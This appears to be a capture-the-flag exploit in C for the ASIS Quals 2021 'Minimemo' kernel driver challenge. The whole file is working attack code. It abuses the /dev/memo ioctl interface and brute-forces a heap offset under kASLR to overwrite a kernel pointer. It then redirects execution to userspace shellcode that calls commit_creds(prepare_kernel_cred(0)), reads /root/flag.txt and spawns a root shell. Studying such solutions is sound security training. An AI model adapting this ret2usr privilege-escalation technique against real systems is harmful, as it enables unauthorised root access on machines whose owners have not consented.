// This is the exploit file written by justCatTheFish team for the Minimemo task from ASIS Quals CTF 2021
// Other writeup links: https://ctftime.org/task/17797
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>

#define CMD_NEW  0x11451401
#define CMD_EDIT 0x11451402
#define CMD_DEL  0x11451403

typedef struct {
  char data[20];
  int id;
  int size;
} request_t;

int fd;

int new() {
    request_t req = {0}; // CMD_NEW does not use request at all
    return ioctl(fd, CMD_NEW, &req);
}

int edit(request_t* req) {
    return ioctl(fd, CMD_EDIT, req);
}

int del(int id) {
    request_t req = { .id = id };
    return ioctl(fd, CMD_DEL, &req);
}

// make func not generate prologue/epilogue
__attribute__((naked))
void shellcode() {
/*
pwndbg> distance 0xffffffff86c709f0 0xffffffff86d5ad53
0xffffffff86c709f0->0xffffffff86d5ad53 is 0xea363 bytes (0x1d46c words)
*$rsp minus above offset and we get prepare_kernel_cred

pwndbg> distance 0xffffffff86c70860 0xffffffff86d5ad53
0xffffffff86c70860->0xffffffff86d5ad53 is 0xea4f3 bytes (0x1d49e words)
*$rsp minus above offset and we get commit_creds
*/
    // rax = *rsp - we get kernel code addr to rax
    asm("mov rax, [rsp]");
    // lets calculate prepare_kernel_cred
    asm("lea rax, [rax-0xea363]");

    // set 1st argument for prepare_kernel_cred
    asm("mov rdi, 0");

    // call prepare_kernel_cred(nullptr)
    asm("call rax");
    // save return value to rdi, needed for commit_cred
    asm("mov rdi, rax");

     // rax = *rsp - we get kernel code addr to rax
    asm("mov rax, [rsp]");
    // lets calculate prepare_kernel_creds
    asm("lea rax, [rax-0xea4f3]");

    // call commit_creds(...)
    asm("call rax");

    // we should be root now
    asm("ret");
}

int main(void) {
    char* p =(char*) mmap((void*)0x4140f000, 0x2000, 7, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    printf("MMAPED AT %p\n", p);

    // USED BEFORE FOR TESTING KERNEL RCE (we do infloop here)
    /*
    for(int i=0; i<0x2000; i+=2) {
        p[i] = '\xeb';
        p[i+1] = '\xfe';
    }*/
    for(int i=0; i<0x2000; i+=2) {
        p[i] = '\x90';
        p[i+1] = '\x90';
    }

    // we need to jump to shellcode, but we are n00bs
    // In [24]: asm('mov rax, 0x4142434445464748; jmp rax', arch='amd64')
    // Out[24]: b'H\xb8HGFEDCBA\xff\xe0'
    memcpy(p+0x1000, "H\xb8HGFEDCBA\xff\xe0", 12);
    *((unsigned long long*)(p+0x1000+2)) = (unsigned long long)&shellcode;

    // sanity infinite loop, WE SHOULD NOT REACH THIS!
    p[0x1000+20] = '\xeb';
    p[0x1000+21] = '\xfe';

    fd = open("/dev/memo", 2);
    if (fd < 0) {
        puts("Error opening device...");
        return 1;
    }

    // we do -4 as this will point to note_t.id and we want to know that id
    // and overwrite note_t.data
    //int brute_offset = 0x2050 - 4; // where we want to point our fd-> to // without kASLR locally our offset was 0x2050
    int brute_offset = 0x9050 - 4; // where we want to point our fd-> to // with kASLR the offset was once 0x9050
    // since there is kASLR we will have to brute one attempt and so ~1/16 attempts

    // Brute ID so it is 0xXXXX2050 (locally nokaslr) or 0xXXXX9050 
    // (remotely; tested with kASLR - we expect the address to be there; to be brute-forced)
    int id;
    while (1) {
        id = new();
        //printf("new = %d\n", id);
        if ((id & 0xffff) == brute_offset) // ON LOCAL WITH nokaslr
        //if ((id & 0x0fff) == (brute_offset & 0x0fff))
            break;
        del(id);
        //printf("del = %d\n", id);
    }

    /*
    puts("Pause");
    getchar();
    puts("Pause off");
    */
    {
        request_t req = {.id=id, .size=22}; // OVERWRITE 2B of ->fd so they point to 0x2050
        for (int i=0; i<20; ++i) {
            req.data[i] = 'a';
        }
        id = edit(&req);
        printf("edit = %d\n", id);
    }

    {
        // Overwrite 
        // 0a:0050│  0xffffffffc0002050 —▸ 0xffffffffc0000000 ◂— push   rbp
        request_t req = {.id=0, .size=8};
        // We write that 0x41410000 address to 0xffffffffc0002050 (local nokaslr)
        // or 0xfffffffXXXXX9050 (kASLR; brute forced address)
        req.data[0] = 0x0;
        req.data[1] = 0x0;
        req.data[2] = 0x41;
        req.data[3] = 0x41;
        req.data[4] = 0x0;
        req.data[5] = 0x0;
        req.data[6] = 0x0;
        req.data[7] = 0x0;
        id = edit(&req);
        printf("edit = %d\n", id);
    }

    puts("Pause before rce to userspace");
    getchar();
    puts("Pause off");
    // call any ioctl to call our userspace code
    new();

    // read flag, we should be root now
    int f = open("/root/flag.txt", 0);
    if (f < 0) {
        puts("Failed to read flag :(");
        system("/bin/sh");
    }
    char flag[128] = {0};
    (void)read(f, flag, sizeof(flag));
    (void)write(1, flag, sizeof(flag));

    // sanity/just in case
    system("/bin/sh");

    close(fd);
}
